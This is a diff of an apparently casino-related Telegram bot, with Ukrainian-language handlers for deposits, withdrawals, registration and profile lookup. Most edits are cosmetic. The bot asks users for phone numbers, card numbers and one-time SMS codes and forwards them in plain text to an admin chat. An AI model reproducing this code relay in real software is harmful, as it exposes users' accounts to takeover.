@@ -15,10 +15,10 @@ from modules.config import ADMIN_ID, DB_NAME
 
 # ——— Константи —————————————————————————————————
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-GIF_PATH = os.path.join(BASE_DIR, "welcome.gif")  # Перевірте, що welcome.gif лежить тут
+GIF_PATH = os.path.join(BASE_DIR, "welcome.gif")  # Переконайтесь, що файл лежить тут
 
 PROVIDERS = ["🏆 CHAMPION", "🎰 SUPEROMATIC"]
-PAYMENTS = ["Карта", "Криптопереказ"]
+PAYMENTS  = ["Карта", "Криптопереказ"]
 
 # ——— Стани ———————————————————————————————
 (
@@ -45,23 +45,20 @@ PAYMENTS = ["Карта", "Криптопереказ"]
 
 
 def init_db():
-    """Ініціалізує таблиці `threads` та `clients`."""
+    """Ініціалізує базові таблиці."""
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute("""
             CREATE TABLE IF NOT EXISTS threads (
                 admin_msg_id INTEGER PRIMARY KEY,
                 user_id       INTEGER
-            )
-        """)
+            )""")
         conn.execute("""
             CREATE TABLE IF NOT EXISTS clients (
                 user_id    INTEGER PRIMARY KEY,
                 phone      TEXT,
                 card       TEXT,
                 authorized INTEGER DEFAULT 0
-            )
-        """)
-        # deposits, withdrawals, registrations створюються у своїх флоу
+            )""")
         conn.commit()
 
 
@@ -70,19 +67,16 @@ def setup_handlers(application):
     conv = ConversationHandler(
         entry_points=[CommandHandler("start", start)],
         states={
-            # Головне меню
             STEP_MENU:               [CallbackQueryHandler(menu_handler)],
-
-            # Підменю клієнта
             STEP_CLIENT_MENU:        [CallbackQueryHandler(client_menu_handler)],
 
-            # Сценарій “Мій профіль”
-            STEP_PROFILE_ENTER_CARD: [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_card)],
-            STEP_PROFILE_ENTER_PHONE:[MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_phone)],
-            STEP_PROFILE_ENTER_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_code)],
+            # “Мій профіль”
+            STEP_PROFILE_ENTER_CARD:  [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_card)],
+            STEP_PROFILE_ENTER_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_phone)],
+            STEP_PROFILE_ENTER_CODE:  [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_enter_code)],
 
-            # Запит карти за телефоном
-            STEP_FIND_CARD_PHONE:    [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_find_phone)],
+            # “Дізнатися картку за телефоном”
+            STEP_FIND_CARD_PHONE:     [MessageHandler(filters.TEXT & ~filters.COMMAND, profile_find_phone)],
 
             # Депозит
             STEP_CLIENT_CARD:        [MessageHandler(filters.TEXT & ~filters.COMMAND, process_card)],
@@ -107,7 +101,7 @@ def setup_handlers(application):
     )
     application.add_handler(conv)
 
-    # Хендлер для reply від адміна (усі теми)
+    # Адмін reply-хендлер
     application.add_handler(
         MessageHandler(filters.TEXT & filters.User(ADMIN_ID) & filters.REPLY, admin_reply),
         group=1,
@@ -121,7 +115,7 @@ def nav_buttons():
     ])
 
 
-# ——— Команда /start ——————————————————————————————
+# ——— /start ——————————————————————————————
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
         [InlineKeyboardButton("🎲 КЛІЄНТ", callback_data="client")],
@@ -155,7 +149,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return STEP_MENU
 
 
-# ——— Головне меню —————————————————————————————————
+# ——— Обробка головного меню ——————————————————————
 async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
     is_admin = query.from_user.id == ADMIN_ID
@@ -166,10 +160,10 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
     if data == "admin_panel":
         kb = [
-            [InlineKeyboardButton("💰 Депозити", callback_data="admin_deposits")],
-            [InlineKeyboardButton("👤 Користувачі", callback_data="admin_users")],
-            [InlineKeyboardButton("📄 Виведення", callback_data="admin_withdrawals")],
-            [InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")],
+            [InlineKeyboardButton("💰 Депозити",    callback_data="admin_deposits")],
+            [InlineKeyboardButton("👤 Користувачі",  callback_data="admin_users")],
+            [InlineKeyboardButton("📄 Виведення",    callback_data="admin_withdrawals")],
+            [InlineKeyboardButton("📊 Статистика",  callback_data="admin_stats")],
             [InlineKeyboardButton("🏠 Головне меню", callback_data="home")],
         ]
         await query.message.reply_text("Панель адміністратора:", reply_markup=InlineKeyboardMarkup(kb))
@@ -178,11 +172,12 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data in ("client", "deposit", "withdraw", "register", "help"):
         return await client_menu_handler(update, context)
 
-    # — Адмін-функції —
+    # Адмін-функції
     if data == "admin_deposits":
         with sqlite3.connect(DB_NAME) as conn:
             rows = conn.execute(
-                "SELECT username, card, provider, payment, amount, timestamp FROM deposits ORDER BY timestamp DESC LIMIT 10"
+                "SELECT username, card, provider, payment, amount, timestamp "
+                "FROM deposits ORDER BY timestamp DESC LIMIT 10"
             ).fetchall()
         text = "Немає депозитів." if not rows else "\n\n".join(
             f"👤 {r[0]}\nКарта: {r[1]}\nПровайдер: {r[2]}\nОплата: {r[3]}\nСума: {r[4]}\n🕒 {r[5]}"
@@ -205,7 +200,8 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "admin_withdrawals":
         with sqlite3.connect(DB_NAME) as conn:
             rows = conn.execute(
-                "SELECT username, amount, method, details, timestamp FROM withdrawals ORDER BY timestamp DESC LIMIT 10"
+                "SELECT username, amount, method, details, timestamp "
+                "FROM withdrawals ORDER BY timestamp DESC LIMIT 10"
             ).fetchall()
         text = "Немає заявок." if not rows else "\n\n".join(
             f"👤 {r[0]}\n💸 {r[1]}\nМетод: {r[2]}\nРеквізити: {r[3]}\n🕒 {r[4]}"
@@ -225,7 +221,7 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data in ("back", "home"):
         return await start(update, context)
 
-    await query.message.reply_text("Функція ще в розробці.", reply_markup=nav_buttons())
+    await query.message.reply_text("Ще в розробці.", reply_markup=nav_buttons())
     return STEP_MENU
 
 
@@ -257,14 +253,14 @@ async def client_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     return STEP_CLIENT_MENU
 
 
-# ——— “Мій профіль” – прямий ввод картки —————————————————
+# ——— “Мій профіль” – прямий ввід картки —————————————————
 async def profile_enter_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card = update.message.text.strip()
     if not re.fullmatch(r"\d{4,7}", card):
-        await update.message.reply_text("4–7 цифр.", reply_markup=nav_buttons())
+        await update.message.reply_text("4–7 цифр, будь ласка.", reply_markup=nav_buttons())
         return STEP_PROFILE_ENTER_CARD
     context.user_data["profile_card"] = card
-    await update.message.reply_text("Введіть телефон (10 цифр):", reply_markup=nav_buttons())
+    await update.message.reply_text("Тепер введіть телефон (10 цифр):", reply_markup=nav_buttons())
     return STEP_PROFILE_ENTER_PHONE
 
 
@@ -272,7 +268,7 @@ async def profile_enter_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
 async def profile_enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
     if not re.fullmatch(r"\d{10}", phone):
-        await update.message.reply_text("10 цифр.", reply_markup=nav_buttons())
+        await update.message.reply_text("10 цифр, будь ласка.", reply_markup=nav_buttons())
         return STEP_PROFILE_ENTER_PHONE
 
     mode = context.user_data.get("profile_mode")
@@ -280,25 +276,23 @@ async def profile_enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     if mode == "direct":
         card = context.user_data["profile_card"]
-        # Надсилаємо адміну на перевірку
         await context.bot.send_message(
             chat_id=ADMIN_ID,
             text=f"Авторизація клієнта – перевірити\nКартка: {card}\nТелефон: {phone}"
         )
-        # Зберігаємо в clients
         with sqlite3.connect(DB_NAME) as conn:
             conn.execute(
-                "INSERT OR REPLACE INTO clients(user_id,phone,card,authorized) VALUES (?,?,?,1)",
+                "INSERT OR REPLACE INTO clients(user_id,phone,card,authorized) VALUES(?,?,?,1)",
                 (user_id, phone, card)
             )
             conn.commit()
         await update.message.reply_text("Авторизовано ✅", reply_markup=nav_buttons())
         return STEP_CLIENT_MENU
 
-    # режим "find"
+    # режим “find”
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute(
-            "INSERT OR REPLACE INTO clients(user_id,phone,authorized) VALUES (?,?,0)",
+            "INSERT OR REPLACE INTO clients(user_id,phone,authorized) VALUES(?,?,0)",
             (user_id, phone)
         )
         conn.commit()
@@ -306,7 +300,7 @@ async def profile_enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE
         chat_id=ADMIN_ID,
         text=f"Хоче дізнатися свій номер картки\nТелефон: {phone}"
     )
-    await update.message.reply_text("Введіть 4-значний код з SMS:", reply_markup=nav_buttons())
+    await update.message.reply_text("Введіть 4-значний код із SMS:", reply_markup=nav_buttons())
     return STEP_PROFILE_ENTER_CODE
 
 
@@ -314,7 +308,7 @@ async def profile_enter_phone(update: Update, context: ContextTypes.DEFAULT_TYPE
 async def profile_enter_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     code = update.message.text.strip()
     if not re.fullmatch(r"\d{4}", code):
-        await update.message.reply_text("4 цифри.", reply_markup=nav_buttons())
+        await update.message.reply_text("4 цифри, будь ласка.", reply_markup=nav_buttons())
         return STEP_PROFILE_ENTER_CODE
 
     user_id = update.effective_user.id
@@ -322,10 +316,9 @@ async def profile_enter_code(update: Update, context: ContextTypes.DEFAULT_TYPE)
         chat_id=ADMIN_ID,
         text=f"Код для клієнта {user_id}: {code}"
     )
-    # Зберігаємо mapping для admin_reply
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute(
-            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES (?,?)",
+            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES(?,?)",
             (msg.message_id, user_id)
         )
         conn.commit()
@@ -334,33 +327,52 @@ async def profile_enter_code(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return STEP_CLIENT_MENU
 
 
+# ——— “Дізнатися картку” за телефоном —————————————————
+async def profile_find_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = update.message.text.strip()
+    if not re.fullmatch(r"\d{10}", phone):
+        await update.message.reply_text("10 цифр, будь ласка.", reply_markup=nav_buttons())
+        return STEP_FIND_CARD_PHONE
+
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"Хоче дізнатися свій номер картки\nТелефон: {phone}"
+    )
+    with sqlite3.connect(DB_NAME) as conn:
+        conn.execute(
+            "INSERT OR REPLACE INTO clients(user_id,phone,authorized) VALUES(?,?,0)",
+            (update.effective_user.id, phone)
+        )
+        conn.commit()
+    await update.message.reply_text("Введіть 4-значний код із SMS:", reply_markup=nav_buttons())
+    return STEP_PROFILE_ENTER_CODE
+
+
 # ——— Reply-хендлер адміністратора —————————————————
 async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    orig_id = update.message.reply_to_message.message_id
+    orig = update.message.reply_to_message.message_id
     with sqlite3.connect(DB_NAME) as conn:
         row = conn.execute(
-            "SELECT user_id FROM threads WHERE admin_msg_id = ?", (orig_id,)
+            "SELECT user_id FROM threads WHERE admin_msg_id=?", (orig,)
         ).fetchone()
     if not row:
-        await update.message.reply_text("Немає ланцюга.")
+        await update.message.reply_text("Ланцюг не знайдено.")
         return
-
     user_id = row[0]
-    # Перевіряємо, чи це profile-код (authorized=0)
+
+    # Якщо клієнт ще не authorized → це картка
     with sqlite3.connect(DB_NAME) as conn:
-        cl = conn.execute(
-            "SELECT authorized FROM clients WHERE user_id = ?", (user_id,)
+        auth = conn.execute(
+            "SELECT authorized FROM clients WHERE user_id=?", (user_id,)
         ).fetchone()
-    if cl and cl[0] == 0:
+    if auth and auth[0] == 0:
         card = update.message.text.strip()
-        # Оновлюємо клієнта
         with sqlite3.connect(DB_NAME) as conn:
             conn.execute(
                 "UPDATE clients SET card=?, authorized=1 WHERE user_id=?",
                 (card, user_id)
             )
             conn.commit()
-        # Доставляємо клієнту картку
         await context.bot.send_message(
             chat_id=user_id,
             text=f"Ваш номер картки: {card}\nАвторизація успішна ✅"
@@ -369,16 +381,16 @@ async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Інакше – звичайний reply
     await context.bot.send_message(chat_id=user_id, text=update.message.text)
-    await update.message.reply_text("✅ Відправлено клієнту.")
+    await update.message.reply_text("✅ Доставлено.")
 
 
-# ——— Флоу Депозит —————————————————————————————
+# ——— Депозит —————————————————————————————
 async def process_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    card = update.message.text.strip()
-    if not re.fullmatch(r"\d{4,5}", card):
+    text = update.message.text.strip()
+    if not re.fullmatch(r"\d{4,5}", text):
         await update.message.reply_text("4–5 цифр.", reply_markup=nav_buttons())
         return STEP_CLIENT_CARD
-    context.user_data["card"] = card
+    context.user_data["card"] = text
     kb = [[InlineKeyboardButton(p, callback_data=p)] for p in PROVIDERS]
     kb.append([InlineKeyboardButton("◀️ Назад", callback_data="back"),
                InlineKeyboardButton("🏠 Головне меню", callback_data="home")])
@@ -394,7 +406,7 @@ async def process_provider(update: Update, context: ContextTypes.DEFAULT_TYPE):
     kb = [[InlineKeyboardButton(p, callback_data=p)] for p in PAYMENTS]
     kb.append([InlineKeyboardButton("◀️ Назад", callback_data="back"),
                InlineKeyboardButton("🏠 Головне меню", callback_data="home")])
-    await query.message.reply_text("Метод оплати:", reply_markup=InlineKeyboardMarkup(kb))
+    await query.message.reply_text("Оберіть метод оплати:", reply_markup=InlineKeyboardMarkup(kb))
     return STEP_PAYMENT
 
 
@@ -416,7 +428,7 @@ async def process_deposit_amount(update: Update, context: ContextTypes.DEFAULT_T
         await update.message.reply_text("Невірна сума.", reply_markup=nav_buttons())
         return STEP_DEPOSIT_AMOUNT
     context.user_data["deposit_amount"] = amt
-    await update.message.reply_text("Надішліть підтвердження (фото/документ/відео):", reply_markup=nav_buttons())
+    await update.message.reply_text("Надішліть підтвердження:", reply_markup=nav_buttons())
     return STEP_CONFIRM_FILE
 
 
@@ -427,51 +439,50 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("◀️ Назад", callback_data="back"),
          InlineKeyboardButton("🏠 Головне меню", callback_data="home")],
     ]
-    await update.message.reply_text("Підтвердьте надсилання:", reply_markup=InlineKeyboardMarkup(kb))
+    await update.message.reply_text("Підтвердіть надсилання:", reply_markup=InlineKeyboardMarkup(kb))
     return STEP_CONFIRMATION
 
 
 async def confirm_submission(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    user     = query.from_user
-    card     = context.user_data["card"]
-    provider = context.user_data["provider"]
-    payment  = context.user_data["payment"]
-    amount   = context.user_data["deposit_amount"]
+    user    = query.from_user
+    card    = context.user_data["card"]
+    prov    = context.user_data["provider"]
+    pay     = context.user_data["payment"]
+    amount  = context.user_data["deposit_amount"]
     file_msg: Message = context.user_data["file"]
 
     caption = (
-        f"Депозит:\nКартка: {card}\nПровайдер: {provider}\n"
-        f"Оплата: {payment}\nСума: {amount}"
+        f"Депозит:\nКартка: {card}\nПровайдер: {prov}\n"
+        f"Оплата: {pay}\nСума: {amount}"
     )
 
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute("""
             CREATE TABLE IF NOT EXISTS deposits (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                id INTEGER PRIMARY KEY,
                 user_id INTEGER, username TEXT,
                 card TEXT, provider TEXT,
                 payment TEXT, amount REAL,
                 file_type TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
+            )""")
         conn.execute("""
             CREATE TABLE IF NOT EXISTS threads (
                 admin_msg_id INTEGER PRIMARY KEY,
                 user_id       INTEGER
-            )
-        """)
+            )""")
         conn.commit()
 
     admin_msg = await file_msg.copy(chat_id=ADMIN_ID, caption=caption)
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute(
-            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES (?,?)",
+            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES(?,?)",
             (admin_msg.message_id, user.id)
         )
         conn.execute(
-            "INSERT INTO deposits(user_id, username, card, provider, payment, amount, file_type) VALUES (?,?,?,?,?,?,?)",
-            (user.id, user.username or "", card, provider, payment, amount,
+            "INSERT INTO deposits(user_id, username, card, provider, payment, amount, file_type) "
+            "VALUES(?,?,?,?,?,?,?)",
+            (user.id, user.username or "", card, prov, pay, amount,
              file_msg.effective_attachment.__class__.__name__)
         )
         conn.commit()
@@ -480,7 +491,7 @@ async def confirm_submission(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return STEP_CLIENT_MENU
 
 
-# ——— Флоу Виведення —————————————————————————————
+# ——— Виведення —————————————————————————————
 async def process_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         amt = float(update.message.text.strip())
@@ -499,10 +510,9 @@ async def process_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_
 
 async def process_withdraw_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    method = query.data
-    if method in ("back","home"):
+    if query.data in ("back","home"):
         return await client_menu_handler(update, context)
-    context.user_data["withdraw_method"] = method
+    context.user_data["withdraw_method"] = query.data
     await query.message.reply_text("Введіть реквізити:", reply_markup=nav_buttons())
     return STEP_WITHDRAW_DETAILS
 
@@ -510,7 +520,7 @@ async def process_withdraw_method(update: Update, context: ContextTypes.DEFAULT_
 async def process_withdraw_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
     details = update.message.text.strip()
     context.user_data["withdraw_details"] = details
-    amt = context.user_data["withdraw_amount"]
+    amt    = context.user_data["withdraw_amount"]
     method = context.user_data["withdraw_method"]
     text = f"Підтвердити виведення?\nСума: {amt}\nМетод: {method}\nРеквізити: {details}"
     kb = InlineKeyboardMarkup([
@@ -524,31 +534,30 @@ async def process_withdraw_details(update: Update, context: ContextTypes.DEFAULT
 
 async def confirm_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    user = query.from_user
-    amt = context.user_data["withdraw_amount"]
-    method = context.user_data["withdraw_method"]
+    user    = query.from_user
+    amt     = context.user_data["withdraw_amount"]
+    method  = context.user_data["withdraw_method"]
     details = context.user_data["withdraw_details"]
 
-    text = f"Виведення:\nСума: {amt}\nМетод: {method}\nРеквізити: {details}"
+    summary = f"Виведення:\nСума: {amt}\nМетод: {method}\nРеквізити: {details}"
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute("""
             CREATE TABLE IF NOT EXISTS withdrawals (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                id INTEGER PRIMARY KEY,
                 user_id INTEGER, username TEXT,
                 amount REAL, method TEXT,
                 details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
+            )""")
         conn.commit()
 
-    admin_msg = await context.bot.send_message(chat_id=ADMIN_ID, text=text)
+    admin_msg = await context.bot.send_message(chat_id=ADMIN_ID, text=summary)
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute(
-            "INSERT INTO withdrawals(user_id, username, amount, method, details) VALUES (?,?,?,?,?)",
+            "INSERT INTO withdrawals(user_id, username, amount, method, details) VALUES(?,?,?,?,?)",
             (user.id, user.username or "", amt, method, details)
         )
         conn.execute(
-            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES (?,?)",
+            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES(?,?)",
             (admin_msg.message_id, user.id)
         )
         conn.commit()
@@ -557,7 +566,7 @@ async def confirm_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return STEP_CLIENT_MENU
 
 
-# ——— Флоу Реєстрація —————————————————————————————
+# ——— Реєстрація —————————————————————————————
 async def register_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["reg_name"] = update.message.text.strip()
     await update.message.reply_text("Введіть телефон (0XXXXXXXXX):", reply_markup=nav_buttons())
@@ -569,21 +578,23 @@ async def register_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not re.fullmatch(r"0\d{9}", phone):
         await update.message.reply_text("Невірний телефон.", reply_markup=nav_buttons())
         return STEP_REG_PHONE
-    name = context.user_data["reg_name"]
+    name    = context.user_data["reg_name"]
     user_id = update.effective_user.id
 
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"Нова реєстрація\nІм'я: {name}\nТелефон: {phone}")
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"Нова реєстрація\nІм'я: {name}\nТелефон: {phone}"
+    )
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute("""
             CREATE TABLE IF NOT EXISTS registrations (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                id INTEGER PRIMARY KEY,
                 user_id INTEGER, name TEXT,
                 phone TEXT, status TEXT DEFAULT 'pending',
                 timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )
-        """)
+            )""")
         conn.execute(
-            "INSERT INTO registrations(user_id, name, phone) VALUES (?,?,?)",
+            "INSERT INTO registrations(user_id, name, phone) VALUES(?,?,?)",
             (user_id, name, phone)
         )
         conn.commit()
@@ -593,11 +604,11 @@ async def register_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def register_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    code = update.message.text.strip()
+    code    = update.message.text.strip()
     if not re.fullmatch(r"\d{4}", code):
         await update.message.reply_text("Невірний код.", reply_markup=nav_buttons())
         return STEP_REG_CODE
-    name = context.user_data["reg_name"]
+    name    = context.user_data["reg_name"]
     user_id = update.effective_user.id
 
     msg = await context.bot.send_message(
@@ -606,7 +617,7 @@ async def register_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     with sqlite3.connect(DB_NAME) as conn:
         conn.execute(
-            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES (?,?)",
+            "INSERT OR REPLACE INTO threads(admin_msg_id, user_id) VALUES(?,?)",
             (msg.message_id, user_id)
         )
         conn.commit()
@@ -615,21 +626,22 @@ async def register_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return STEP_MENU
 
 
-# ——— Хендлер reply для адміністратора —————————————————
+# ——— Reply-хендлер адміністратора —————————————————
 async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
     orig = update.message.reply_to_message.message_id
     with sqlite3.connect(DB_NAME) as conn:
-        row = conn.execute(
-            "SELECT user_id FROM threads WHERE admin_msg_id = ?", (orig,)
+        r = conn.execute(
+            "SELECT user_id FROM threads WHERE admin_msg_id=?", (orig,)
         ).fetchone()
-    if not row:
+    if not r:
         await update.message.reply_text("Ланцюг не знайдено.")
         return
-    user_id = row[0]
-    # Якщо клієнт в процесі авторизації profile_find_phone
+    user_id = r[0]
+
+    # Якщо клієнт не авторизований → це картка для профілю
     with sqlite3.connect(DB_NAME) as conn:
         auth = conn.execute(
-            "SELECT authorized FROM clients WHERE user_id = ?", (user_id,)
+            "SELECT authorized FROM clients WHERE user_id=?", (user_id,)
         ).fetchone()
     if auth and auth[0] == 0:
         card = update.message.text.strip()
@@ -639,8 +651,12 @@ async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 (card, user_id)
             )
             conn.commit()
-        await context.bot.send_message(chat_id=user_id, text=f"Ваш номер картки: {card}\nАвторизація успішна ✅")
+        await context.bot.send_message(
+            chat_id=user_id,
+            text=f"Ваш номер картки: {card}\nАвторизація успішна ✅"
+        )
         return
-    # Сюди default-reply (депозити / виведення / реєстрація)
+
+    # Інакше – звичайний reply
     await context.bot.send_message(chat_id=user_id, text=update.message.text)
     await update.message.reply_text("✅ Доставлено.")
